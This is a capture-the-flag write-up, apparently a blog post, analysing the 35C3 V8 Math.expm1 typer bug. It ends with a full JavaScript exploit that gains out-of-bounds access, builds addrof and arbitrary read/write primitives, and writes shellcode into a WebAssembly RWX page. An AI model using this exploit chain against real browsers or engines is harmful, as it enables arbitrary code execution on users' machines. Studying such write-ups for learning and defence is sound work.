---
title: "expm1-35C3 - Bug/ Optimizations Analysis"
date: 2024-02-19
draft: false
tags: ["math.expm1", "typer", "OOB"]
---

We answer the question: Is `Math.expm1(-0)` actually `-0` ?
<!--more-->

## Understanding the bug:
- typer runs
    - typer phase.
    - TypeNarrowingReducer - load elimination phase.
    - simplified lowering phase. 
- math.expm1(-0) is always -0, but the typer is making a mistake of `range` as (plainNumber, NaN) but -0 is not a plain number or a NaN. 

![idek4](/images/math_expm_bug/image-3.png)

## Object.is()

> 1- Initial phase
- The typer assigns this as a SameValue node in IR 

![initial](/images/math_expm_bug/image.png)

> 2- TypedOptimization - ReduceSameValue
```
else if (lhs_type.Is(Type::MinusZero())) {
    // SameValue(x:minus-zero,y) => ObjectIsMinusZero(y)
    node->RemoveInput(0);
    NodeProperties::ChangeOp(node, simplified()->ObjectIsMinusZero());
    return Changed(node);
  } else if (rhs_type.Is(Type::MinusZero())) {
    // SameValue(x,y:minus-zero) => ObjectIsMinusZero(x)
    node->RemoveInput(1);
    NodeProperties::ChangeOp(node, simplified()->ObjectIsMinusZero());
    return Changed(node);
  }
```

![idek1](/images/math_expm_bug/image-1.png)

> 3- simplified lowering
```
case IrOpcode::kObjectIsMinusZero: 
Type const input_type = GetUpperBound(node->InputAt(0));
if (input_type.Is(Type::MinusZero())) {
    VisitUnop(node, UseInfo::None(), MachineRepresentation::kBit);
    if (lower()) {
    DeferReplacement(node, lowering->jsgraph()->Int32Constant(1));
    }
}
```

![idek2](/images/math_expm_bug/image-2.png)

## Patch and the bug details:

- Math.expm1 gets converted to a (Float64Expm1 and ChangeFloat64ToTagged) which will just truncate the -0 to a 0
- Using a call node, inbuilt v8 math.expm1 we can avoid this.
- The patch is applied only to the typer.cc and not the operation-typer so we can produce a call node from the v8 builtins to get the math.expm1 in v8 which still has the incorrect type assumtions set.

![ide](/images/math_expm_bug/image-4.png)

## Pipeline of turbofan:
![idk](/images/math_expm_bug/image-5.png)

## Typer phase:
- Go through all the nodes and send it to GraphReducer.
- Try to associate the type with the following node.

## Type lowering:
- does a shit ton of optimisation like

![bob](/images/math_expm_bug/image-7.png)

## Ecape analysis:
![bob](/images/math_expm_bug/image-6.png)

## Simplified lowering:
- Has a lot more cases to optimization.

## Exploitation:

- Problem: Our sameValue has type of boolean that made the type assumption of (0, 1337) and hence no OOB access. 
![bob](/images/math_expm_bug/image-8.png)
![bob](/images/math_expm_bug/image-9.png)

- Like the blog said we have to keep the samevalue node until the last optimization and fold it to be true. Which means the compiler should'nt know that we are comparing with -0 untill the last optimization.
- in escape analysis we can fix the -0 to the object.is() and in simplified lowering we get our desired range value and hence a removal of the checkbounds because the `assumed` return type is false and it will always be inside the array limits. hopefully.

> #79:CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call)  [Static type: Range(0, 4), Feedback type: Range(0, 0)]

![idekde](/images/math_expm_bug/image-10.png)

## OOB Array creation:
- Using the OOB array access we can just leak the addrof objects if we keep it nearby to a float array.
- After a lot of trial and error and lot of monkey patching I finally found a way to get memory leak kinda better.
```py
function addrof(x, i=1){
    let a = [1.1, 2.2, 3.3];
    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
    let o = {m: -0};
    let t = Object.is(Math.expm1(x), o.m) + 0;
    t *= (i+0); // i to integral.
    let val = a[t];
    oob_rw_buffer = b;
    return val;
}
```
- a is the array to get out of bounds. b is the array where I want to change the length field.
- tricky stuff: the parameter value `i` is not having much type, So I added it with 0 to make sure the type gets fixed to the integral type. Now the feedback along with this will make out oob read possible. silly JS engine. 
- finally storing the context of b into oob_rw_buffer. Given below is the rough leak after the fixed array of `a`.

```
3) int: 0x7a7e2501459
4) int: 0x500000000
5) int: 0x4016000000000000
6) int: 0x4016000000000000
7) int: 0x4016000000000000
8) int: 0x4016000000000000
9) int: 0x4016000000000000
10) int: 0x375928582cf9   - (map of b)
11) int: 0x7a7e2500c21    - (property of b)
12) int: 0x65ad13cc1c9    - (element backing pointer of b)
13) int: 0x500000000      - (length field)
14) int: 0x7a7e2500561
15) int: 0x8000000000000000
16) int: 0x3ff199999999999a
17) int: 0x3ff199999999999a
18) int: 0x3ff199999999999a
19) int: 0x3ff199999999999a
```

### Addrof primitive:
- Since we have the OOB array and having a another array after helps us to achieve a oob array read hence having a addrof primitive.
![bob](/images/math_expm_bug/image-11.png)

### Arb read/ Arb write:
- We can just store the ArrayBuffer after all the allocations and calculate the offset difference between the arraybuffer and oob array and use that to get arb_read and arb_write.
```js
function arb_write(addr, val){
    oob_rw_buffer[diff/8n] = addr.i2f();
    dv.setBigUint64(0, val, true);
}
```
```js
function arb_read(addr){
    oob_rw_buffer[diff/8n] = addr.i2f();
    return dv.getBigUint64(0, true);
}
```

## Final Exploit:

```js
// ------------------------------------------------ Utility- Functions ------------------------------------------------ //
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

// ----------------------------------------------- Starting the exploit ----------------------------------------------- //

let oob_rw_buffer = undefined;
let aux_arr = undefined;

function addrof(obj){
    aux_arr[0] = obj;
    return oob_rw_buffer[0x12];
}

function stage1(x, i=1){
    let a = [1.1, 2.2, 3.3];
    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
    let c = [{}, 1, 2];
    let o = {m: -0};
    let t = Object.is(Math.expm1(x), o.m) + 0; // trigger the bug.
    t *= (i+0); // i to inegral.
    a[t] = 1024*1024;
    oob_rw_buffer = b; // expose b to global scope
    aux_arr = c;
    return 0;
  }

stage1(0);
for(let i=0;i<100000;i++){
    stage1("0");
}
stage1(-0, 13); // get the OOB array.
console.log("[+] Stage 1: Obtained a OOB array");

// Stage 2
function arb_write(addr, val){
  oob_rw_buffer[diff/8n] = addr.i2f();
  dv.setUint32(0, val, true);
}

function arb_read(addr){
  oob_rw_buffer[diff/8n] = addr.i2f();
  return dv.getBigUint64(0, true);
}

function shell_write(addr, shellcode){
  for(let i=0;i<shellcode.length;i++){
    arb_write(addr+BigInt(4*i), shellcode[i]);
  }
}
let buf = new ArrayBuffer(0x100);
let dv = new DataView(buf);

buf_addr = addrof(buf).f2i();
oob_addr = addrof(oob_rw_buffer).f2i();
let diff = buf_addr-oob_addr+72n; //from the OOB array to array buffer 

console.log("[+] ArrayBuffer addr: " + buf_addr.hex());
console.log("[+] Offset btw oob and arraybuffer: " + diff);


// wasm for RWS shellcode
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

rwx = arb_read(addrof(wasmInstance).f2i() +0x00e8n -1n);
console.log("[+] Got the Address of RWX segment: " + rwx.hex());
shell_write(rwx, shellcode);
func(); 
```

## Debugging stuff:
- Helper code for GDB is basically located in src/objects-printer.cc
- Node structure for all the sea of nodes. 
  - **Methods:**
  - New, clone, isDead, kill...
  - **Variables:**
  - like op(description of the computation):
    - opcode related
    - properties 

  - --trace-turbo: to get the thingy for turbolizer graph.
  - --trace-representation: it gives out the feedback types and info about each of the optimization phases. 

## Links:
- https://abiondo.me/2019/01/02/exploiting-math-expm1-v8
- https://www.jaybosamiya.com/blog/2019/01/02/krautflare/